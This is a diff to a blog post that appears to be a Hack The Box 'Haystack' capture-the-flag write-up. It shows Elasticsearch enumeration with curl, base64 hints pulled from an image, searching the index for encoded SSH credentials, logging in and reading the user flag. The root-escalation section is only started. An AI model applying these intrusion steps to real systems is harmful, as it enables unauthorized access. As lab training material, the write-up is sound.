@@ -47,36 +47,119 @@ Sounds like only one page with heystack image available.
 
 Port 9200 enumeration:<br>
 We can figure out that Elasticsearch is running.
-![placeholder](https://inar1.github.io/public/images/2019-11-05/heystack-badge.png)
 {% highlight shell %}
-
+root@kali:~# curl http://10.10.10.115:9200/
+{
+  "name" : "iQEYHgS",
+  "cluster_name" : "elasticsearch",
+  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
+  "version" : {
+    "number" : "6.4.2",
+    "build_flavor" : "default",
+    "build_type" : "rpm",
+    "build_hash" : "04711c2",
+    "build_date" : "2018-09-26T13:34:09.098244Z",
+    "build_snapshot" : false,
+    "lucene_version" : "7.4.0",
+    "minimum_wire_compatibility_version" : "5.6.0",
+    "minimum_index_compatibility_version" : "5.0.0"
+  },
+  "tagline" : "You Know, for Search"
+}
 {% endhighlight %}
 
 ### 2. Getting User
 
-At first, take a look at Elasticsearch.
-
-
-
-Next, go back to port 80 again.<br>
+At first, take a look at port 80<br>.
 We have only one file "needle.jpg" there.<br>
+{% highlight html %}
+root@kali:~# curl http://10.10.10.115
+<html>
+<body>
+<img src="needle.jpg" />
+</body>
+</html>
+{% endhighlight %}
+
 To check if something interesting there, we can use "strings" command.
 {% highlight shell %}
+root@kali:~# strings needle.jpg 
+JFIF
+Exif
+paint.net 4.1.1
+UNICODE
+$3br
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+	#3R
+&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+sc,x
 
+~~~
+
+bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
 {% endhighlight %}
 
 We found base64 encoded data.<br>
 Then, decode the message. We get a message with unknown language.
 {% highlight shell %}
-
+root@kali:~# echo 'bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==' | base64 -d
+la aguja en el pajar es "clave"
 {% endhighlight %}
 
 Google is always our friend. Translate the message.
 ![placeholder](https://inar1.github.io/public/images/2019-11-05/heystack-badge.png)
+{% highlight shell %}
+la aguja en el pajar es "clave"
+
+->
+the needle in the haystack is "key"
+{% endhighlight %}
+
+Then, go back to elasticsearch.
 
 
+To send a query to elasticsearch, we need a parameter "q".
+{% highlight shell %}
+root@kali:~# curl http://10.10.10.115:9200/_search?q=clave
+{"took":136,"timed_out":false,"_shards":{"total":11,"successful":11,"skipped":0,"failed":0},"hits":{"total":2,"max_score":5.9335938,"hits":[{"_index":"quotes","_type":"quote","_id":"45","_score":5.9335938,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}},{"_index":"quotes","_type":"quote","_id":"111","_score":5.3459888,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}]}}
+{% endhighlight %}
+
+We found other information. Translate it again.<br>
+We got a credential for user "security" to login with ssh.
+{% highlight shell%}
+root@kali:~# ssh security@10.10.10.115
+security@10.10.10.115's password: 
+Last login: Tue Nov  5 14:44:15 2019 from 10.10.14.13
+[security@haystack ~]$ id
+uid=1000(security) gid=1000(security) groups=1000(security) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+{% endhighlight %}
+
+As always, user.txt is in the home directory.
+{% highlight shell %}
+[security@haystack ~]$ ls -la
+total 16
+drwx------. 2 security security  99 Feb  6  2019 .
+drwxr-xr-x. 3 root     root      22 Nov 28  2018 ..
+lrwxrwxrwx. 1 root     root       9 Jan 25  2019 .bash_history -> /dev/null
+-rw-r--r--. 1 security security  18 Apr 10  2018 .bash_logout
+-rw-r--r--. 1 security security 193 Apr 10  2018 .bash_profile
+-rw-r--r--. 1 security security 231 Apr 10  2018 .bashrc
+-rw-r--r--. 1 security security  33 Feb  6  2019 user.txt
+
+[security@haystack ~]$ cat user.txt 
+04d18bc79dac1d4d48ee0a940c8eb929
+{% endhighlight %}
 
 ### 3. Getting Root
 
+After got user, to identify the rinning process, run "pspy".<br>
+We can find that "logstash" is running as root.
+{% highlight shell %}
 
+{% endhighlight %}
 
+However, only user "kibana" can read the configuration file.<br>
+This time, we need a lateral movement.
+{% highlight shell %}
+
+{% endhighlight %}
